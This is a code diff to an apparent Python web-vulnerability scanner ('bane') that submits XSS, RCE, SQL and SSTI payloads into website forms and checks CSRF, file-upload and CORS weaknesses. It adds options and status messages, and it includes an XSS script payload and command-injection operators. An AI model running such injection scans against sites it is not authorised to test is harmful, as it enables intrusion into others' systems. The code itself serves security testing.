@@ -118,7 +118,7 @@ def setup_to_submit(form):
 
 def xss_submit(parsed,payload,replaceble_parameters,debug=False,enctype='application/x-www-form-urlencoded'):
   '''
-   this function is for xss test with GET requests.
+   
 
   '''
   d,fi=setup_to_submit(parsed[0])
@@ -172,16 +172,16 @@ def setup_ua(usra):
 
 
 
-def xss_forms(u,payload=None,unicode_random_level=0,js_function="alert",predefined_inputs={},replaceble_parameters={"phpvalue":((".",""),)},file_extension='png',context_breaker='">',save_to_file=None,logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None,debug=False,mime_type=None):
+def xss_forms(u,payload=None,unicode_random_level=0,number=(1,9),js_function="alert",dont_change={},predefined_inputs={},replaceble_parameters={"phpvalue":((".",""),)},file_extension='png',context_breaker='">',save_to_file=None,logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None,debug=False,mime_type=None):
   '''
    this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
    usage:
   
    >>>import bane
-   >>>bane.xss('http://www.example.com/")
+   >>>bane.xss_forms('http://www.example.com/")
 
-   >>>bane.xss('http://www.example.com/',payload="<script>alert(123);</script>")
+   >>>bane.xss_forms('http://www.example.com/',payload="<script>alert(123);</script>")
    
   '''
   target_page=u
@@ -230,9 +230,9 @@ def xss_forms(u,payload=None,unicode_random_level=0,js_function="alert",predefin
      l=[]
      for x in l1['inputs']:
       if x["name"].strip() not in leave_empty and x["name"].strip() not in dont_send:
-       if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"]:#any input type that accept direct input from keyboard
+       if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"] and x["name"] not in dont_change:#any input type that accept direct input from keyboard
         i=x["name"]
-        parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,leave_empty=leave_empty,dont_send=dont_send,mime_type=mime_type,predefined_inputs=predefined_inputs)
+        parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,dont_change=dont_change,number=number,leave_empty=leave_empty,dont_send=dont_send,mime_type=mime_type,predefined_inputs=predefined_inputs)
         xss_res=xss_submit(parsed_form,xp,replaceble_parameters,debug=debug,enctype=l1['enctype'])
         if xss_res[0]==True:
           x="parameter: '"+i+"' => [+]Payload was found"
@@ -254,7 +254,7 @@ def xss_forms(u,payload=None,unicode_random_level=0,js_function="alert",predefin
 
 def rce_submit(parsed,payload,based_on,replaceble_parameters,debug=False,enctype='application/x-www-form-urlencoded',type_injection="code"):
   '''
-   this function is for xss test with GET requests.
+   
 
   '''
   d,fi=setup_to_submit(parsed[0])
@@ -313,14 +313,14 @@ def rce_submit(parsed,payload,based_on,replaceble_parameters,debug=False,enctype
   return (False,'')
 
 
-def rce_forms(u,payload_index=0,save_to_file=None,injection={"code":"php"},code_operator_right='',code_operator_left='',command_operator_right='|',command_operator_left='&',sql_operator_right="or '",sql_operator_left="' or ",file_extension='png',replaceble_parameters={"phpvalue":((".",""),)},based_on="time",delay=10,logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=120,user_agent=None,cookie=None,debug=False,mime_type=None,predefined_inputs={}):
+def rce_forms(u,payload_index=0,save_to_file=None,dont_change={},number=(1,9),injection={"code":"php"},code_operator_right='',code_operator_left='',command_operator_right='|',command_operator_left='&',sql_operator_right="or '",sql_operator_left="' or ",file_extension='png',replaceble_parameters={"phpvalue":((".",""),)},based_on="time",delay=10,logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=120,user_agent=None,cookie=None,debug=False,mime_type=None,predefined_inputs={}):
   '''
    this function is for RCE test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
    usage:
   
    >>>import bane
-   >>>bane.rce('http://phptester.net/")
+   >>>bane.rce_forms('http://phptester.net/")
 
   '''
   payloads={
@@ -473,9 +473,9 @@ def rce_forms(u,payload_index=0,save_to_file=None,injection={"code":"php"},code_
      for x in l1['inputs']:
       if x["name"].strip() not in leave_empty and x["name"].strip() not in dont_send:
        try:
-        if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"]:#any input type that accept direct input from keyboard
+        if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"] and x["name"] not in dont_change:#any input type that accept direct input from keyboard
          i=x["name"]
-         parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,leave_empty=leave_empty,dont_send=dont_send,mime_type=mime_type,predefined_inputs=predefined_inputs)
+         parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,number=number,leave_empty=leave_empty,dont_send=dont_send,mime_type=mime_type,predefined_inputs=predefined_inputs,dont_change=dont_change)
          _res=rce_submit(parsed_form,xp,based_on,replaceble_parameters,debug=debug,enctype=l1['enctype'],type_injection=list(injection.keys())[0])
          if _res[0]==True:
            x="parameter: '"+i+"' => [+] Vulnerable !!"
@@ -506,7 +506,7 @@ def rce_forms(u,payload_index=0,save_to_file=None,injection={"code":"php"},code_
 
 def ssti_submit(parsed,payload,replaceble_parameters,debug=False,enctype='application/x-www-form-urlencoded',eval_value=1111111101):
   '''
-   this function is for xss test with GET requests.
+   
   '''
   d,fi=setup_to_submit(parsed[0])
   for x in d:
@@ -550,16 +550,16 @@ def safe_eval(a,o,b):
  return eval(a+o+b)
 
 
-def ssti_forms(u,payload_index=0,values=(9,123456789),operator="*",save_to_file=None,file_extension='png',replaceble_parameters={"phpvalue":((".",""),)},logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=120,user_agent=None,cookie=None,debug=False,mime_type=None,predefined_inputs={}):
+def ssti_forms(u,payload_index=0,values=(9,123456789),dont_change={},number=(1,9),payload_keyword='payload',operator="*",save_to_file=None,file_extension='png',replaceble_parameters={"phpvalue":((".",""),)},logs=True,fill_empty=10,leave_empty=[],dont_send=['btnClear'],proxy=None,proxies=None,timeout=120,user_agent=None,cookie=None,debug=False,mime_type=None,predefined_inputs={}):
   '''
-   this function is for RCE test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
+   this function is for SSTI test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
    usage:
   
    >>>import bane
-   >>>bane.rce('http://phptester.net/")
+   >>>bane.ssti_forms('http://phptester.net/")
   '''
   target_page=u
-  xp=ssti_list[payload_index]%{"payload":"{}{}{}".format(values[0],operator,values[1])}
+  xp=ssti_list[payload_index].replace(payload_keyword,"{}{}{}".format(values[0],operator,values[1]))
   xp_eval=safe_eval("{}".format(values[0]),operator,"{}".format(values[1]))
   target_page=u
   form_index=-1
@@ -595,9 +595,9 @@ def ssti_forms(u,payload_index=0,values=(9,123456789),operator="*",save_to_file=
      for x in l1['inputs']:
       if x["name"].strip() not in leave_empty and x["name"].strip() not in dont_send:
        try:
-        if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"]:#any input type that accept direct input from keyboard
+        if x["type"] in ["hidden","file","text","textarea","email","tel","search","url","password","number","select","radio","checkbox"] and x["name"] not in dont_change:#any input type that accept direct input from keyboard
          i=x["name"]
-         parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,leave_empty=leave_empty,dont_send=dont_send,mime_type=mime_type,predefined_inputs=predefined_inputs)
+         parsed_form=set_up_injection(target_page,form_index,i,xp,cookie,setup_ua(user_agent),setup_proxy(proxy,proxies),timeout,fill_empty,file_extension=file_extension,number=number,leave_empty=leave_empty,dont_send=dont_send,mime_type=mime_type,predefined_inputs=predefined_inputs,dont_change=dont_change)
          _res=ssti_submit(parsed_form,xp,replaceble_parameters,debug=debug,enctype=l1['enctype'],eval_value=xp_eval)
          if _res[0]==True:
            x="parameter: '"+i+"' => [+] Vulnerable !!"
@@ -970,15 +970,17 @@ def csrf_forms(u,proxy=None,timeout=10,show_warnings=True,user_agent=None,cookie
     d=json.dumps(d)
    r=requests.post(x["action"],data=d,files=f,proxies=proxy,timeout=timeout,headers=h)
   if all(i in r.text for i in l):
-    vu.append(x)
+    vu.append((x,"Found all data"))
   elif r.status_code==200 and any(i in r.text for i in l):
-   vu.append(x)
+   vu.append((x,"Found some data"))
    if show_warnings==True:
     print("Warning: HTTP Status Code: 200 , but we didn't find some of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again")
+  elif r.status_code==200 and not any(i in r.text for i in l) and any( i in r.text.lower() for i in ["unauthorized","invalid","unacceptable"]):
+   return False
   elif r.status_code==200 and not any(i in r.text for i in l):
    if show_warnings==True:
     print("Warning: HTTP Status Code: 200 , but we didn't find any of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again")
-   vu.append(x)
+   vu.append((x,"Found no data but Status Code: 200"))
  return vu
 
 
@@ -986,7 +988,7 @@ def file_upload(u,proxy=None,timeout=10,show_warnings=True,user_agent=None,cooki
  l=[]
  x=forms_parser(u,proxy=proxy,timeout=timeout,user_agent=user_agent,cookie=cookie)
  fo=get_upload_form(x)
- d,f=setup_to_submit(form_filler(fo,'','',mime_type=mime_type,predefined_inputs=predefined_inputs))
+ d,f=setup_to_submit(form_filler(fo,'','',mime_type=mime_type,file_extension=file_extension,predefined_inputs=predefined_inputs))
  for x in d:
    for y in replaceble_parameters:
     if x==y:
@@ -1009,18 +1011,20 @@ def file_upload(u,proxy=None,timeout=10,show_warnings=True,user_agent=None,cooki
  try:
   r=requests.post(fo["action"],data=d,files=f,proxies=proxy,timeout=timeout,headers=h)
   if all(i in r.text for i in l):
-    return True
+    return True,"Found all data"
   elif r.status_code==200 and any(i in r.text for i in l):
    if show_warnings==True:
     print("Warning: HTTP Status Code: 200 , but we didn't find some of our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again")
-   return True
+   return True,"Missing some data"
+  elif r.status_code==200 and not any(i in r.text for i in l) and any( i in r.text.lower() for i in ["only accept","invalid","unacceptable"]):
+   return False,"Unacceptable file extension"
   elif r.status_code==200 and not any(i in r.text for i in l):
    if show_warnings==True:
     print("Warning: HTTP Status Code: 200 , but we didn't find our submitted data, so it's probably vulnerable but they are saved somewhere else..\nPlease check manually by visiting the form again")
-   return True
+   return True,"Missing all data but Status Code: 200"
  except:
   pass
- return False
+ return False,"Found no data and Status Code NOT: 200"
 
 
 
@@ -1048,10 +1052,10 @@ def cors_reflection(u,proxy=None,timeout=10,user_agent=None,cookie=None,origin="
     print(x+" : "+r[x])
   if a and b:
    if a==origin and b=="true":
-    return (True,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b})
+    return (True,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b,"Vulnerable":True})
  except:
   pass
- return (False,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b})
+ return (False,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b,"Vulnerable":False})
  
 def cors_wildcard(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=False):
  a=None
@@ -1076,10 +1080,10 @@ def cors_wildcard(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=Fals
     print(x+" : "+r[x])
   if a and b:
    if a=="*" and b=="true":
-    return (True,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b})
+    return (True,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b,"Vulnerable":True})
  except:
   pass
- return (False,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b})
+ return (False,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b,"Vulnerable":False})
 
 def cors_null(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=False):
  a=None
@@ -1104,10 +1108,10 @@ def cors_null(u,proxy=None,timeout=10,user_agent=None,cookie=None,debug=False):
     print(x+" : "+r[x])
   if a and b:
    if a=="null" and b=="true":
-    return (True,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b})
+    return (True,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b,"Vulnerable":True})
  except:
   pass
- return (False,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b})
+ return (False,{"Access-Control-Allow-Origin":a,"Access-Control-Allow-Credentials":b,"Vulnerable":False})
 
 def proxies_select(proxy,proxies):
  if proxy:
